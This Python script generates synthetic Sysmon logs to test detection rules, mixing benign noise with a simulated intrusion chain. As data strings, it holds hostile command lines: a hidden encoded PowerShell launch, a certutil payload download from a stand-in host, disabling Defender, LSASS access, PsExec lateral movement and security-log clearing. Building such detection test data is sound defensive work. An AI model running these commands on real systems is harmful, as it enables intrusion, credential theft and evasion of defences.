"""Generate synthetic Sysmon-style logs: benign noise + simulated attack chains.

Malicious events carry an `_expected` field (ATT&CK technique ID) used ONLY for
validating detections (true/false positives); detection rules never read it.
"""
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(42)
START = datetime(2026, 10, 12, 8, 0, 0)

HOSTS = ["WS-FIN-01", "WS-HR-02", "WS-DEV-03", "SRV-APP-01"]
USERS = {"WS-FIN-01": "CORP\\alice", "WS-HR-02": "CORP\\bob",
         "WS-DEV-03": "CORP\\carol", "SRV-APP-01": "CORP\\svc_app"}

_t = START


def ts(step=None):
    global _t
    _t += timedelta(seconds=step or random.randint(5, 90))
    return _t.strftime("%Y-%m-%d %H:%M:%S")


def proc(host, image, cmd, parent, expected=None):
    return {"UtcTime": ts(), "EventID": 1, "Computer": host, "User": USERS[host],
            "Image": image, "CommandLine": cmd, "ParentImage": parent,
            "_expected": expected}


def reg(host, image, target, expected=None):
    return {"UtcTime": ts(), "EventID": 13, "Computer": host, "User": USERS[host],
            "Image": image, "TargetObject": target, "_expected": expected}


def access(host, image, access_mask, expected=None):
    return {"UtcTime": ts(), "EventID": 10, "Computer": host, "User": USERS[host],
            "Image": image, "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": access_mask, "_expected": expected}


def benign(n=300):
    events = []
    templates = [
        ("{h}", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         "chrome.exe --type=renderer", "C:\\Windows\\explorer.exe"),
        ("{h}", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs",
         "C:\\Windows\\System32\\services.exe"),
        ("{h}", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "WINWORD.EXE /n report.docx", "C:\\Windows\\explorer.exe"),
        ("{h}", "C:\\Windows\\System32\\notepad.exe", "notepad.exe notes.txt",
         "C:\\Windows\\explorer.exe"),
        ("{h}", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir",
         "C:\\Windows\\explorer.exe"),
        ("{h}", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -File C:\\scripts\\backup.ps1", "C:\\Windows\\System32\\svchost.exe"),
    ]
    for _ in range(n):
        h = random.choice(HOSTS)
        _, image, cmd, parent = random.choice(templates)
        events.append(proc(h, image, cmd, parent))
    # benign events that LOOK suspicious (false-positive candidates)
    events.append(proc("WS-DEV-03", "C:\\Windows\\System32\\whoami.exe", "whoami /priv",
                       "C:\\Windows\\System32\\cmd.exe"))  # admin checking own privileges
    events.append(proc("SRV-APP-01", "C:\\Windows\\System32\\schtasks.exe",
                       "schtasks /create /tn Updater /tr C:\\app\\update.exe /sc daily",
                       "C:\\Windows\\System32\\msiexec.exe"))  # installer (filtered)
    events.append(access("SRV-APP-01", "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe",
                         "0x1410"))  # AV reading LSASS (filtered)
    events.append(reg("WS-HR-02", "C:\\Program Files\\Zoom\\installer.exe",
                      "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Zoom"))
    return events


def attack_chain():
    """Simulated intrusion on WS-FIN-01 -> lateral movement to SRV-APP-01."""
    h, s = "WS-FIN-01", "SRV-APP-01"
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    return [
        proc(h, cmd, "cmd.exe /c powershell", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "T1204.002"),
        proc(h, ps, "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA ", cmd, "T1059.001"),
        proc(h, "C:\\Windows\\System32\\certutil.exe",
             "certutil.exe -urlcache -split -f http://198.51.100.7/payload.exe C:\\Users\\Public\\p.exe", ps, "T1105"),
        proc(h, "C:\\Windows\\System32\\whoami.exe", "whoami /all", ps, "T1033"),
        proc(h, "C:\\Windows\\System32\\net.exe", "net user /domain", ps, "T1087.001"),
        proc(h, "C:\\Windows\\System32\\net.exe", "net group \"Domain Admins\" /domain", ps, "T1087.001"),
        proc(h, "C:\\Windows\\System32\\schtasks.exe",
             "schtasks /create /tn Sync /tr C:\\Users\\Public\\p.exe /sc onlogon", ps, "T1053.005"),
        reg(h, "C:\\Windows\\System32\\reg.exe",
            "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "T1547.001"),
        proc(h, ps, "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", cmd, "T1562.001"),
        access(h, "C:\\Users\\Public\\p.exe", "0x1010", "T1003.001"),
        proc(h, "C:\\Tools\\PsExec.exe", "psexec.exe \\\\SRV-APP-01 -s cmd.exe", ps, "T1021.002"),
        proc(s, "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\System32\\services.exe", "T1021.002"),
        proc(s, "C:\\Windows\\System32\\wevtutil.exe", "wevtutil.exe cl Security ", cmd, "T1070.001"),
    ]


def main():
    events = benign() + attack_chain()
    events.sort(key=lambda e: e["UtcTime"])
    out = Path("logs/sysmon_events.json")
    out.write_text(json.dumps(events, indent=1), encoding="utf-8")
    print(f"[+] Generated {len(events)} events -> {out}")


if __name__ == "__main__":
    main()
